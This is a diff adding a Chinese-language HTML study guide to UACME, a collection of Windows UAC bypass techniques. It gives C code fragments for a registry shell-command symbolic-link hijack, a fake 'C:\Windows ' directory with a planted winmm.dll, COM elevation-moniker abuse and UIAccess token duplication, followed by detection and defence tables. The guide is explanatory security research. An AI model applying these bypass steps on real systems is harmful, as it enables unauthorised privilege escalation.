@@ -1,0 +1,1069 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UACME 技术学习指南</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Microsoft YaHei', 'Segoe UI', Arial, sans-serif;
+            line-height: 1.8;
+            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 50%, #1a1a1a 100%);
+            color: #e4e4e4;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        header {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 30px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            border: 1px solid #444;
+            text-align: center;
+        }
+        h1 {
+            color: #00ff00;
+            font-size: 2.5em;
+            margin-bottom: 15px;
+            font-family: 'Courier New', monospace;
+        }
+        .subtitle {
+            color: #888;
+            font-size: 1.1em;
+        }
+        .section {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border: 1px solid #444;
+        }
+        h2 {
+            color: #00ff00;
+            font-size: 1.8em;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #444;
+        }
+        h3 {
+            color: #00ccff;
+            font-size: 1.4em;
+            margin: 20px 0 15px 0;
+        }
+        h4 {
+            color: #ff6600;
+            font-size: 1.2em;
+            margin: 15px 0 10px 0;
+        }
+        p {
+            margin-bottom: 15px;
+            text-align: justify;
+        }
+        .code-block {
+            background: #0a0a0a;
+            border: 1px solid #00ff00;
+            border-radius: 6px;
+            padding: 15px;
+            margin: 15px 0;
+            overflow-x: auto;
+        }
+        .code-block code {
+            color: #c9d1d9;
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size: 0.9em;
+        }
+        .keyword {
+            color: #ff7b72;
+        }
+        .function {
+            color: #d2a8ff;
+        }
+        .string {
+            color: #a5d6ff;
+        }
+        .comment {
+            color: #8b949e;
+        }
+        .number {
+            color: #79c0ff;
+        }
+        .api-card {
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid #00ff00;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 15px 0;
+        }
+        .api-name {
+            color: #00ff00;
+            font-size: 1.3em;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .api-desc {
+            color: #888;
+            margin-bottom: 10px;
+        }
+        .api-doc-link {
+            display: inline-block;
+            background: #00ff00;
+            color: #000;
+            padding: 8px 15px;
+            border-radius: 5px;
+            text-decoration: none;
+            margin-top: 10px;
+            font-weight: bold;
+        }
+        .api-doc-link:hover {
+            background: #00cc00;
+        }
+        .warning-box {
+            background: rgba(255, 102, 0, 0.2);
+            border: 2px solid #ff6600;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        .warning-title {
+            color: #ff6600;
+            font-weight: bold;
+            font-size: 1.2em;
+            margin-bottom: 10px;
+        }
+        .info-box {
+            background: rgba(0, 204, 255, 0.15);
+            border: 2px solid #00ccff;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        .info-title {
+            color: #00ccff;
+            font-weight: bold;
+            font-size: 1.2em;
+            margin-bottom: 10px;
+        }
+        ul, ol {
+            margin: 15px 0;
+            padding-left: 30px;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        .method-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+        .method-item {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 15px;
+            border-radius: 8px;
+            border-left: 4px solid #00ff00;
+        }
+        .method-name {
+            color: #00ff00;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+        .method-desc {
+            color: #888;
+            font-size: 0.9em;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        th, td {
+            padding: 12px 15px;
+            text-align: left;
+            border: 1px solid #444;
+        }
+        th {
+            background: #1a1a1a;
+            color: #00ff00;
+        }
+        td {
+            background: rgba(0, 0, 0, 0.2);
+        }
+        .nav-menu {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .nav-menu a {
+            color: #00ccff;
+            text-decoration: none;
+            margin: 0 15px;
+            padding: 5px 10px;
+        }
+        .nav-menu a:hover {
+            background: #00ff00;
+            color: #000;
+            border-radius: 3px;
+        }
+        .flow-box {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid #00ff00;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+        .flow-title {
+            color: #00ff00;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .tech-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+        .tech-item {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 20px;
+            border-radius: 8px;
+            border-left: 4px solid #00ccff;
+        }
+        .tech-title {
+            color: #00ccff;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        footer {
+            text-align: center;
+            padding: 20px;
+            color: #888;
+            margin-top: 30px;
+        }
+        .version-table {
+            margin: 20px 0;
+        }
+        .version-table th {
+            background: #1a1a1a;
+        }
+        .supported {
+            color: #00ff00;
+        }
+        .partial {
+            color: #ffcc00;
+        }
+        .unsupported {
+            color: #ff0000;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>UACME 技术学习指南</h1>
+            <p class="subtitle">Windows UAC绕过技术全面解析 - 60+种方法深度剖析</p>
+        </header>
+
+        <nav class="nav-menu">
+            <a href="#overview">项目概述</a>
+            <a href="#uac-mechanism">UAC机制</a>
+            <a href="#appinfo-rpc">AppInfo RPC</a>
+            <a href="#methods">绕过方法</a>
+            <a href="#shell-hijack">Shell劫持</a>
+            <a href="#directory-mock">目录模拟</a>
+            <a href="#com-elevation">COM提升</a>
+            <a href="#token-ops">令牌操作</a>
+            <a href="#defense">防御检测</a>
+        </nav>
+
+        <section id="overview">
+            <h2>项目概述</h2>
+            <p>UACME是由安全研究员hfiref0x开发的Windows UAC绕过工具集合，实现了超过60种不同的UAC绕过方法。项目涵盖了从Windows 7到Windows 11的各种系统版本，是UAC安全研究的重要参考。</p>
+            
+            <div class="info-box">
+                <div class="info-title">核心组件</div>
+                <table>
+                    <tr>
+                        <th>组件</th>
+                        <th>功能</th>
+                        <th>说明</th>
+                    </tr>
+                    <tr>
+                        <td>Akagi</td>
+                        <td>主程序</td>
+                        <td>方法选择和执行框架</td>
+                    </tr>
+                    <tr>
+                        <td>Fubuki</td>
+                        <td>DLL载荷</td>
+                        <td>32位payload执行模块</td>
+                    </tr>
+                    <tr>
+                        <td>Akatsuki</td>
+                        <td>DLL载荷</td>
+                        <td>64位payload执行模块</td>
+                    </tr>
+                    <tr>
+                        <td>Kamikaze</td>
+                        <td>MSC文件</td>
+                        <td>MMC snap-in配置</td>
+                    </tr>
+                </table>
+            </div>
+
+            <h3>方法分类</h3>
+            <div class="method-grid">
+                <div class="method-item">
+                    <div class="method-name">注册表劫持</div>
+                    <div class="method-desc">Shell\Open\Command、环境变量、ProgID等</div>
+                </div>
+                <div class="method-item">
+                    <div class="method-name">COM接口利用</div>
+                    <div class="method-desc">IFileOperation、提升Moniker等</div>
+                </div>
+                <div class="method-item">
+                    <div class="method-name">目录/文件系统</div>
+                    <div class="method-desc">可信目录模拟、重解析点、DLL劫持</div>
+                </div>
+                <div class="method-item">
+                    <div class="method-name">令牌操作</div>
+                    <div class="method-desc">UIAccess令牌、完整性级别修改</div>
+                </div>
+                <div class="method-item">
+                    <div class="method-name">MMC/Snap-in</div>
+                    <div class="method-desc">自定义MSC文件、Flash对象执行</div>
+                </div>
+                <div class="method-item">
+                    <div class="method-name">计划任务</div>
+                    <div class="method-desc">环境变量劫持、任务触发</div>
+                </div>
+            </div>
+        </section>
+
+        <section id="uac-mechanism">
+            <h2>UAC机制原理</h2>
+
+            <h3>UAC架构</h3>
+            <div class="flow-box">
+                <div class="flow-title">UAC提升流程</div>
+                <ol>
+                    <li>用户/程序请求提升权限</li>
+                    <li>请求发送到AppInfo服务</li>
+                    <li>AppInfo验证请求和应用程序</li>
+                    <li>检查是否为auto-elevation程序</li>
+                    <li>如需确认，启动Consent.exe显示提示</li>
+                    <li>用户确认后，创建提升进程</li>
+                    <li>返回进程信息给请求者</li>
+                </ol>
+            </div>
+
+            <h3>关键组件</h3>
+            <table>
+                <tr>
+                    <th>组件</th>
+                    <th>作用</th>
+                    <th>权限</th>
+                </tr>
+                <tr>
+                    <td>AppInfo服务</td>
+                    <td>处理UAC提升请求</td>
+                    <td>SYSTEM</td>
+                </tr>
+                <tr>
+                    <td>Consent.exe</td>
+                    <td>显示UAC提示界面</td>
+                    <td>SYSTEM</td>
+                </tr>
+                <tr>
+                    <td>LSASS</td>
+                    <td>令牌创建和管理</td>
+                    <td>SYSTEM</td>
+                </tr>
+                <tr>
+                    <td>auto-elevation</td>
+                    <td>自动提升机制</td>
+                    <td>无需用户确认</td>
+                </tr>
+            </table>
+
+            <h3>自动提升条件</h3>
+            <div class="info-box">
+                <div class="info-title">auto-elevation程序特征</div>
+                <ul>
+                    <li>位于可信目录(System32, Program Files等)</li>
+                    <li>由Microsoft签名</li>
+                    <li>在注册表中配置为auto-elevation</li>
+                    <li>特定的文件名或GUID</li>
+                    <li>某些COM接口支持auto-elevation</li>
+                </ul>
+            </div>
+
+            <div class="api-card">
+                <div class="api-name">AppInfo服务</div>
+                <div class="api-desc">UAC机制的核心服务，负责处理权限提升请求。</div>
+                <p>服务路径: %SystemRoot%\system32\appinfo.dll</p>
+                <p>RPC接口: LaunchAdminProcess (GUID: 201ef99a-7fa0-444c-9399-19ba84f12a1a)</p>
+            </div>
+        </section>
+
+        <section id="appinfo-rpc">
+            <h2>AppInfo RPC接口</h2>
+
+            <h3>RPC接口定义</h3>
+            <div class="code-block">
+                <code>
+<span class="comment">// LaunchAdminProcess RPC接口</span>
+<span class="keyword">static const</span> RPC_CLIENT_INTERFACE LaunchAdminProcess___RpcClientInterface = {
+    <span class="keyword">sizeof</span>(RPC_CLIENT_INTERFACE),
+    {{<span class="number">0x201ef99a</span>,<span class="number">0x7fa0</span>,<span class="number">0x444c</span>,{<span class="number">0x93</span>,<span class="number">0x99</span>,<span class="number">0x19</span>,<span class="number">0xba</span>,<span class="number">0x84</span>,<span class="number">0xf1</span>,<span class="number">0x2a</span>,<span class="number">0x1a</span>}}, {<span class="number">1</span>,<span class="number">0</span>}},
+    {{<span class="number">0x8A885D04</span>,<span class="number">0x1CEB</span>,<span class="number">0x11C9</span>,{<span class="number">0x9F</span>,<span class="number">0xE8</span>,<span class="number">0x08</span>,<span class="number">0x00</span>,<span class="number">0x2B</span>,<span class="number">0x10</span>,<span class="number">0x48</span>,<span class="number">0x60</span>}}, {<span class="number">2</span>,<span class="number">0</span>}},
+    ...
+};
+                </code>
+            </div>
+
+            <h3>RAiLaunchAdminProcess函数</h3>
+            <div class="code-block">
+                <code>
+<span class="keyword">void</span> <span class="function">RAiLaunchAdminProcess</span>(
+    PRPC_ASYNC_STATE AsyncHandle,  <span class="comment">// 异步状态</span>
+    handle_t hBinding,              <span class="comment">// RPC绑定</span>
+    wchar_t *ExecutablePath,        <span class="comment">// 可执行路径</span>
+    wchar_t *CommandLine,          <span class="comment">// 命令行参数</span>
+    <span class="keyword">long</span> StartFlags,               <span class="comment">// 启动标志(1=提升)</span>
+    <span class="keyword">long</span> CreationFlags,            <span class="comment">// 创建标志</span>
+    wchar_t *CurrentDirectory,     <span class="comment">// 当前目录</span>
+    wchar_t *WindowStation,        <span class="comment">// 窗口站</span>
+    APP_STARTUP_INFO *StartupInfo, <span class="comment">// 启动信息</span>
+    ULONGLONG hWnd,                <span class="comment">// 窗口句柄</span>
+    <span class="keyword">long</span> Timeout,                  <span class="comment">// 超时</span>
+    APP_PROCESS_INFORMATION *ProcessInfo, <span class="comment">// 进程信息输出</span>
+    <span class="keyword">long</span> *ElevationType            <span class="comment">// 提升类型输出</span>
+);
+                </code>
+            </div>
+
+            <h3>关键参数说明</h3>
+            <table>
+                <tr>
+                    <th>参数</th>
+                    <th>值</th>
+                    <th>说明</th>
+                </tr>
+                <tr>
+                    <td>StartFlags</td>
+                    <td>1</td>
+                    <td>请求管理员权限提升</td>
+                </tr>
+                <tr>
+                    <td>CreationFlags</td>
+                    <td>CREATE_UNICODE_ENVIRONMENT等</td>
+                    <td>进程创建标志</td>
+                </tr>
+                <tr>
+                    <td>ElevationType</td>
+                    <td>输出值</td>
+                    <td>返回提升类型信息</td>
+                </tr>
+            </table>
+
+            <div class="api-card">
+                <div class="api-name">NdrAsyncClientCall</div>
+                <div class="api-desc">执行异步RPC客户端调用，用于与AppInfo服务通信。</div>
+                <p>特点：异步调用，需要等待RPC_ASYNC_STATE完成</p>
+            </div>
+        </section>
+
+        <section id="methods">
+            <h2>绕过方法总览</h2>
+
+            <h3>方法列表(部分)</h3>
+            <table>
+                <tr>
+                    <th>方法ID</th>
+                    <th>方法名称</th>
+                    <th>技术类型</th>
+                    <th>适用版本</th>
+                </tr>
+                <tr>
+                    <td>22</td>
+                    <td>UacMethodSXS</td>
+                    <td>SxS配置劫持</td>
+                    <td>Win7+</td>
+                </tr>
+                <tr>
+                    <td>23</td>
+                    <td>UacMethodDISM</td>
+                    <td>DISM模块劫持</td>
+                    <td>Win7+</td>
+                </tr>
+                <tr>
+                    <td>31</td>
+                    <td>UacMethodWow64Logger</td>
+                    <td>Wow64日志器劫持</td>
+                    <td>Win7+</td>
+                </tr>
+                <tr>
+                    <td>33</td>
+                    <td>UacMethodUiAccess</td>
+                    <td>UIAccess令牌修改</td>
+                    <td>Win7+</td>
+                </tr>
+                <tr>
+                    <td>34</td>
+                    <td>UacMethodMsSettings</td>
+                    <td>ms-settings协议劫持</td>
+                    <td>Win10+</td>
+                </tr>
+                <tr>
+                    <td>35</td>
+                    <td>UacMethodTyranid</td>
+                    <td>环境变量劫持</td>
+                    <td>Win8+</td>
+                </tr>
+                <tr>
+                    <td>37</td>
+                    <td>UacMethodJunction</td>
+                    <td>注册表符号链接</td>
+                    <td>Win7+</td>
+                </tr>
+                <tr>
+                    <td>40</td>
+                    <td>UacMethodCMLuaUtil</td>
+                    <td>COM接口利用</td>
+                    <td>Win7+</td>
+                </tr>
+                <tr>
+                    <td>51</td>
+                    <td>UacMethodDirectoryMock</td>
+                    <td>可信目录模拟</td>
+                    <td>Win7+</td>
+                </tr>
+                <tr>
+                    <td>56</td>
+                    <td>UacMethodTokenModUiAccess</td>
+                    <td>令牌完整性修改</td>
+                    <td>Win7+</td>
+                </tr>
+            </table>
+
+            <h3>版本适用性</h3>
+            <table class="version-table">
+                <tr>
+                    <th>方法类型</th>
+                    <th>Win7</th>
+                    <th>Win8</th>
+                    <th>Win10</th>
+                    <th>Win11</th>
+                </tr>
+                <tr>
+                    <td>Shell劫持</td>
+                    <td class="supported">支持</td>
+                    <td class="supported">支持</td>
+                    <td class="partial">部分</td>
+                    <td class="partial">部分</td>
+                </tr>
+                <tr>
+                    <td>可信目录</td>
+                    <td class="supported">支持</td>
+                    <td class="supported">支持</td>
+                    <td class="supported">支持</td>
+                    <td class="supported">支持</td>
+                </tr>
+                <tr>
+                    <td>MMC劫持</td>
+                    <td class="supported">支持</td>
+                    <td class="supported">支持</td>
+                    <td class="supported">支持</td>
+                    <td class="supported">支持</td>
+                </tr>
+                <tr>
+                    <td>COM提升</td>
+                    <td class="supported">支持</td>
+                    <td class="supported">支持</td>
+                    <td class="supported">支持</td>
+                    <td class="supported">支持</td>
+                </tr>
+                <tr>
+                    <td>环境变量</td>
+                    <td class="supported">支持</td>
+                    <td class="supported">支持</td>
+                    <td class="supported">支持</td>
+                    <td class="partial">部分</td>
+                </tr>
+            </table>
+        </section>
+
+        <section id="shell-hijack">
+            <h2>注册表Shell劫持</h2>
+
+            <h3>技术原理</h3>
+            <p>通过修改注册表中的Shell\Open\Command键值，劫持特定应用程序或协议的打开行为，使其执行攻击者指定的payload。</p>
+
+            <h3>实现步骤</h3>
+            <div class="code-block">
+                <code>
+<span class="comment">// 1. 创建Slave键(包含payload)</span>
+<span class="function">ucmxCreateSlaveKey</span>(classesKey, lpszPayload, &szSlaveKey[1]);
+
+<span class="comment">// Slave键结构:</span>
+<span class="comment">// HKCU\Software\Classes\{GUID}</span>
+<span class="comment">//   (Default) = "payload路径"</span>
+<span class="comment">//   DelegateExecute = "" (空值)</span>
+
+<span class="comment">// 2. 创建Master键并设置符号链接</span>
+_strcat(szMasterKey, T_SHELL_OPEN);  <span class="comment">// shell\open</span>
+<span class="function">RegCreateKeyEx</span>(classesKey, szMasterKey, ...);
+
+<span class="comment">// 3. 创建command键为符号链接</span>
+<span class="function">NtCreateKey</span>(&targetKey, KEY_ALL_ACCESS, &obja, 
+    REG_OPTION_CREATE_LINK | REG_OPTION_VOLATILE, ...);
+<span class="function">NtSetValueKey</span>(targetKey, &CmSymbolicLinkValue, 0, REG_LINK, 
+    usSlaveKey.Buffer, usSlaveKey.Length);
+
+<span class="comment">// 4. 触发目标程序</span>
+<span class="function">ShellExecuteEx</span>(&shinfo);
+                </code>
+            </div>
+
+            <h3>目标程序/协议</h3>
+            <table>
+                <tr>
+                    <th>目标</th>
+                    <th>注册表路径</th>
+                    <th>触发方式</th>
+                </tr>
+                <tr>
+                    <td>ms-settings:</td>
+                    <td>ms-settings\shell\open\command</td>
+                    <td>打开ms-settings:协议</td>
+                </tr>
+                <tr>
+                    <td>sdclt.exe</td>
+                    <td>sdclt\shell\open\command</td>
+                    <td>运行sdclt.exe</td>
+                </tr>
+                <tr>
+                    <td>changepk.exe</td>
+                    <td>Launcher\shell\open\command</td>
+                    <td>运行changepk.exe</td>
+                </tr>
+            </table>
+
+            <div class="api-card">
+                <div class="api-name">NtSetValueKey (REG_LINK)</div>
+                <div class="api-desc">设置注册表键值，REG_LINK类型创建符号链接。</div>
+                <p>符号链接可以重定向注册表查询到另一个键路径。</p>
+            </div>
+
+            <div class="warning-box">
+                <div class="warning-title">关键点: DelegateExecute</div>
+                <p>DelegateExecute值必须设置为空。如果存在此值，系统会使用COM委托执行而非直接执行命令。设置为空可绕过COM验证机制。</p>
+            </div>
+        </section>
+
+        <section id="directory-mock">
+            <h2>可信目录模拟</h2>
+
+            <h3>技术原理</h3>
+            <p>利用Windows路径解析的特殊行为，创建带有空格的虚假"Windows"目录，通过重解析点将其指向攻击者控制的目录，绕过可信目录验证。</p>
+
+            <h3>实现步骤</h3>
+            <div class="code-block">
+                <code>
+<span class="comment">// 1. 在%temp%创建system32目录</span>
+_strcpy(szPayloadDir, g_ctx->szTempDirectory);
+_strcat(szPayloadDir, L<span class="string">"system32\\"</span>);
+<span class="function">CreateDirectory</span>(szPayloadDir, NULL);
+
+<span class="comment">// 2. 将payload写入为winmm.dll</span>
+_strcat(szDest, WINMM_DLL);  <span class="comment">// winmm.dll</span>
+<span class="function">supWriteBufferToFile</span>(szDest, ProxyDll, ProxyDllSize);
+
+<span class="comment">// 3. 复制winsat.exe到%temp%\system32</span>
+<span class="function">CopyFile</span>(szSource, szDest, FALSE);
+
+<span class="comment">// 4. 创建虚假"Windows "目录(带空格)</span>
+_strcat(szSource, L<span class="string">"Windows "</span>);  <span class="comment">// 注意末尾空格!</span>
+<span class="function">supCreateDirectory</span>(&hFakeWindows, &ObjectAttributes, ...);
+
+<span class="comment">// 5. 设置重解析点指向%temp%</span>
+<span class="function">supSetMountPoint</span>(hFakeWindows, szSource, &szSource[4]);
+
+<span class="comment">// 6. 执行虚假路径下的winsat.exe</span>
+_strcat(szSource, L<span class="string">"Windows \\system32\\winsat.exe"</span>);
+<span class="function">supRunProcess</span>(szSource, NULL);
+                </code>
+            </div>
+
+            <h3>路径解析过程</h3>
+            <div class="flow-box">
+                <div class="flow-title">路径解析流程</div>
+                <ol>
+                    <li>请求执行: "C:\Windows \system32\winsat.exe"</li>
+                    <li>解析"C:\Windows " (带空格)</li>
+                    <li>发现重解析点，重定向到"%temp%"</li>
+                    <li>最终路径: "%temp%\system32\winsat.exe"</li>
+                    <li>winsat.exe加载winmm.dll时从%temp%\system32加载</li>
+                    <li>执行攻击者的winmm.dll</li>
+                </ol>
+            </div>
+
+            <div class="api-card">
+                <div class="api-name">supSetMountPoint</div>
+                <div class="api-desc">设置目录的重解析点(Reparse Point)，实现目录重定向。</div>
+                <p>使用IO_REPARSE_TAG_MOUNT_POINT标签创建挂载点。</p>
+            </div>
+
+            <div class="info-box">
+                <div class="info-title">为什么需要空格?</div>
+                <p>Windows在验证可信目录时，会检查路径是否为"C:\Windows\system32"等标准路径。创建"C:\Windows "目录(带空格)可以绕过这个验证，因为系统会先解析这个特殊目录名，然后通过重解析点重定向。</p>
+            </div>
+        </section>
+
+        <section id="com-elevation">
+            <h2>COM自动提升</h2>
+
+            <h3>提升Moniker</h3>
+            <div class="code-block">
+                <code>
+<span class="comment">// 提升Moniker格式</span>
+<span class="string">"Elevation:Administrator!new:{CLSID}"</span>
+<span class="string">"Elevation:Highest!new:{CLSID}"</span>
+
+<span class="comment">// 使用示例</span>
+<span class="keyword">HRESULT</span> <span class="function">ucmAllocateElevatedObject</span>(LPCWSTR lpObjectCLSID, ...) {
+    BIND_OPTS3 bop;
+    WCHAR szMoniker[MAX_PATH];
+    
+    bop.cbStruct = <span class="keyword">sizeof</span>(bop);
+    bop.dwClassContext = CLSCTX_LOCAL_SERVER;
+    
+    <span class="comment">// 构造提升Moniker</span>
+    _strcpy(szMoniker, T_ELEVATION_MONIKER_ADMIN);
+    _strcat(szMoniker, lpObjectCLSID);
+    
+    <span class="comment">// 通过提升Moniker获取提升后的COM对象</span>
+    <span class="keyword">HRESULT</span> hr = <span class="function">CoGetObject</span>(szMoniker, (BIND_OPTS*)&bop, riid, &ElevatedObject);
+}
+                </code>
+            </div>
+
+            <h3>IFileOperation接口</h3>
+            <div class="code-block">
+                <code>
+<span class="comment">// 获取提升后的IFileOperation</span>
+<span class="function">ucmAllocateElevatedObject</span>(T_CLSID_FileOperation, &IID_IFileOperation, ...);
+
+<span class="comment">// 设置操作标志</span>
+FileOperation->lpVtbl-><span class="function">SetOperationFlags</span>(FileOperation, 
+    FOF_NOCONFIRMATION | FOF_SILENT);
+
+<span class="comment">// 创建ShellItem</span>
+<span class="function">SHCreateItemFromParsingName</span>(OldName, NULL, &IID_IShellItem, &psiDestDir);
+
+<span class="comment">// 执行重命名</span>
+FileOperation->lpVtbl-><span class="function">RenameItem</span>(FileOperation, psiDestDir, NewName, NULL);
+FileOperation->lpVtbl-><span class="function">PerformOperations</span>(FileOperation);
+                </code>
+            </div>
+
+            <h3>支持auto-elevation的COM类</h3>
+            <table>
+                <tr>
+                    <th>COM类</th>
+                    <th>CLSID</th>
+                    <th>功能</th>
+                </tr>
+                <tr>
+                    <td>FileOperation</td>
+                    <td>{3ad05575-8857-4850-9277-11b85bdb8e09}</td>
+                    <td>文件操作</td>
+                </tr>
+                <tr>
+                    <td>WScriptShell</td>
+                    <td>{f935dc20-1cf0-11d0-adb9-00c04fd58a0b}</td>
+                    <td>Shell执行</td>
+                </tr>
+                <tr>
+                    <td>ShellWindows</td>
+                    <td>{9ba05972-f6a8-11cf-a442-00a0c90a8f39}</td>
+                    <td>Shell窗口</td>
+                </tr>
+            </table>
+
+            <div class="api-card">
+                <div class="api-name">CoGetObject</div>
+                <div class="api-desc">将显示名称转换为Moniker并绑定到对象，支持提升Moniker。</div>
+                <a href="https://learn.microsoft.com/windows/win32/api/objbase/nf-objbase-cogetobject" class="api-doc-link" target="_blank">微软官方文档</a>
+            </div>
+
+            <div class="api-card">
+                <div class="api-name">The COM Elevation Moniker</div>
+                <div class="api-desc">允许标准用户激活具有提升权限的COM类。</div>
+                <a href="https://learn.microsoft.com/windows/win32/com/the-com-elevation-moniker" class="api-doc-link" target="_blank">微软官方文档</a>
+            </div>
+        </section>
+
+        <section id="token-ops">
+            <h2>令牌操作技术</h2>
+
+            <h3>UIAccess令牌获取</h3>
+            <div class="code-block">
+                <code>
+<span class="comment">// 启动osk.exe(屏幕键盘，具有UIAccess权限)</span>
+shinfo.lpFile = <span class="string">"C:\\Windows\\System32\\osk.exe"</span>;
+<span class="function">ShellExecuteEx</span>(&shinfo);
+
+<span class="comment">// 打开进程令牌</span>
+<span class="function">NtOpenProcessToken</span>(shinfo.hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hProcessToken);
+
+<span class="comment">// 复制令牌</span>
+<span class="function">NtDuplicateToken</span>(hProcessToken, TOKEN_ALL_ACCESS, &obja, 
+    FALSE, TokenPrimary, &hDupToken);
+                </code>
+            </div>
+
+            <h3>完整性级别修改</h3>
+            <div class="code-block">
+                <code>
+<span class="comment">// 降低完整性级别从Medium+到Medium</span>
+<span class="function">RtlAllocateAndInitializeSid</span>(&MLAuthority, 
+    <span class="number">1</span>, SECURITY_MANDATORY_MEDIUM_RID, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, &pIntegritySid);
+
+tml.Label.Attributes = SE_GROUP_INTEGRITY;
+tml.Label.Sid = pIntegritySid;
+
+<span class="function">NtSetInformationToken</span>(hDupToken, TokenIntegrityLevel, &tml, 
+    <span class="keyword">sizeof</span>(TOKEN_MANDATORY_LABEL) + <span class="function">RtlLengthSid</span>(pIntegritySid));
+                </code>
+            </div>
+
+            <h3>完整性级别定义</h3>
+            <table>
+                <tr>
+                    <th>级别</th>
+                    <th>RID值</th>
+                    <th>数值</th>
+                    <th>说明</th>
+                </tr>
+                <tr>
+                    <td>Untrusted</td>
+                    <td>0x0000</td>
+                    <td>0x00000000</td>
+                    <td>不可信</td>
+                </tr>
+                <tr>
+                    <td>Low</td>
+                    <td>0x1000</td>
+                    <td>0x00001000</td>
+                    <td>低完整性</td>
+                </tr>
+                <tr>
+                    <td>Medium</td>
+                    <td>0x2000</td>
+                    <td>0x00002000</td>
+                    <td>中等完整性</td>
+                </tr>
+                <tr>
+                    <td>Medium+</td>
+                    <td>0x2100</td>
+                    <td>0x00002100</td>
+                    <td>中等+ (UIAccess)</td>
+                </tr>
+                <tr>
+                    <td>High</td>
+                    <td>0x3000</td>
+                    <td>0x00003000</td>
+                    <td>高完整性</td>
+                </tr>
+                <tr>
+                    <td>System</td>
+                    <td>0x4000</td>
+                    <td>0x00004000</td>
+                    <td>系统完整性</td>
+                </tr>
+            </table>
+
+            <div class="api-card">
+                <div class="api-name">NtSetInformationToken</div>
+                <div class="api-desc">设置令牌信息，包括完整性级别。</div>
+                <p>TokenIntegrityLevel类用于修改令牌的完整性级别。</p>
+            </div>
+
+            <div class="info-box">
+                <div class="info-title">UIAccess权限特性</div>
+                <ul>
+                    <li>允许与更高完整性级别的窗口交互</li>
+                    <li>用于辅助功能程序(屏幕键盘、放大镜等)</li>
+                    <li>完整性级别为Medium+ (0x2100)</li>
+                    <li>降低到Medium后仍保持UIAccess能力</li>
+                    <li>可绕过某些UI隔离限制</li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="defense">
+            <h2>防御与检测</h2>
+
+            <h3>检测方法</h3>
+            <table>
+                <tr>
+                    <th>检测点</th>
+                    <th>方法</th>
+                    <th>特征</th>
+                </tr>
+                <tr>
+                    <td>注册表修改</td>
+                    <td>监控Shell\Open\Command键</td>
+                    <td>异常的符号链接或DelegateExecute为空</td>
+                </tr>
+                <tr>
+                    <td>目录创建</td>
+                    <td>监控特殊目录名</td>
+                    <td>"Windows "等带空格的目录名</td>
+                </tr>
+                <tr>
+                    <td>重解析点</td>
+                    <td>监控IO_REPARSE_TAG_MOUNT_POINT</td>
+                    <td>指向非标准位置的重解析点</td>
+                </tr>
+                <tr>
+                    <td>COM调用</td>
+                    <td>监控提升Moniker</td>
+                    <td>"Elevation:Administrator"字符串</td>
+                </tr>
+                <tr>
+                    <td>AppInfo RPC</td>
+                    <td>监控RAiLaunchAdminProcess</td>
+                    <td>异常的启动参数或路径</td>
+                </tr>
+            </table>
+
+            <h3>防御措施</h3>
+            <div class="warning-box">
+                <div class="warning-title">建议防御措施</div>
+                <ol>
+                    <li>启用UAC最高级别(AlwaysNotify)</li>
+                    <li>监控关键注册表键的修改</li>
+                    <li>检测异常的目录和重解析点创建</li>
+                    <li>审计auto-elevation COM类的使用</li>
+                    <li>部署EDR监控AppInfo RPC调用</li>
+                    <li>限制UIAccess应用程序的令牌使用</li>
+                    <li>定期更新系统修复已知漏洞</li>
+                </ol>
+            </div>
+
+            <h3>UAC级别说明</h3>
+            <table>
+                <tr>
+                    <th>级别</th>
+                    <th>设置</th>
+                    <th>防护效果</th>
+                </tr>
+                <tr>
+                    <td>AlwaysNotify</td>
+                    <td>最高</td>
+                    <td>所有提升都需要确认，阻止大部分绕过</td>
+                </tr>
+                <tr>
+                    <td>Default</td>
+                    <td>默认</td>
+                    <td>非Windows程序需要确认，部分绕过有效</td>
+                </tr>
+                <tr>
+                    <td>Default-NoElevate</td>
+                    <td>中低</td>
+                    <td>不提示桌面变化，更多绕过有效</td>
+                </tr>
+                <tr>
+                    <td>NeverNotify</td>
+                    <td>最低</td>
+                    <td>完全禁用UAC，所有绕过都有效</td>
+                </tr>
+            </table>
+        </section>
+
+        <section>
+            <h2>学习要点总结</h2>
+
+            <div class="tech-grid">
+                <div class="tech-item">
+                    <div class="tech-title">UAC架构</div>
+                    <ul>
